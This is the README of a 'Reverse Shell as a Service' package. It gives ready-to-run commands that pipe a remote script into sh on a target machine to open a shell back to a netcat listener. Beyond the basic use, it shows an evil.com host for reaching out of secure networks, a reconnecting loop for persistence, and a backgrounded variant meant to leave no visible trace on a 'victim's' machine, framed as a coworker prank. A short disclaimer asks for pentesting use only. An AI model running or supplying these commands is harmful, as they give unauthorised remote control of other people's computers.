# reverse-shell

> Reverse Shell as a Service - https://shell.now.sh

[![Build Status](https://travis-ci.org/lukechilds/reverse-shell.svg?branch=master)](https://travis-ci.org/lukechilds/reverse-shell)
[![Coverage Status](https://coveralls.io/repos/github/lukechilds/reverse-shell/badge.svg?branch=master)](https://coveralls.io/github/lukechilds/reverse-shell?branch=master)
[![npm](https://img.shields.io/npm/v/reverse-shell.svg)](https://www.npmjs.com/package/reverse-shell)

Easy to remember reverse shell that should work on most Unix-like systems.

Detects available software on the target and runs an appropriate payload.

## Usage

### 1. Listen for connection

On your machine, open up a port and listen on it. You can do this easily with netcat.

```shell
nc -l 1337
```
### 2. Execute reverse shell on target

On the target machine, pipe the output of https://shell.now.sh/yourip:port into sh.

```shell
curl https://shell.now.sh/192.168.0.69:1337 | sh
```

Go back to your machine, you should now have a shell prompt.

### 3. Don't be a dick

This is meant to be used for pentesting or helping coworkers understand why they should always lock their computers. Please don't use this for anything malicious.

## Demo

<img src="https://i.imgur.com/qqjhxAw.gif" width="808">

## Tips

### Hostname

You can use a hostname instead of an IP.

```shell
curl https://shell.now.sh/localhost:1337 | sh
```

### Remote connections

Because this is a reverse connection it can punch through firewalls and connect to the internet.

You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with.

```shell
curl https://shell.now.sh/evil.com:1337 | sh
```

### Reconnecting

By default when the shell exits you lose your connection. You may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect by wrapping it in a while loop.

```shell
while true; do curl https://shell.now.sh/yourip:1337 | sh; done
```

Be careful if you do this to a coworker, if they leave the office with this still running you're opening them up to attack.

### Running as a background process

The terminal session needs to be kept open to persist the reverse shell connection. That might be a bit of a giveaway if you're trying to prank coworkers.

The following command will run the reverse shell in a background process and exit the terminal, leaving no suspicious looking terminal windows open on the victim's machine.

Make sure you run this in a fresh terminal window otherwise you'll lose any work in your existing session.

```shell
sh -c "curl https://shell.now.sh/localhost:1337 | sh -i &" && exit
```

## License

MIT © Luke Childs
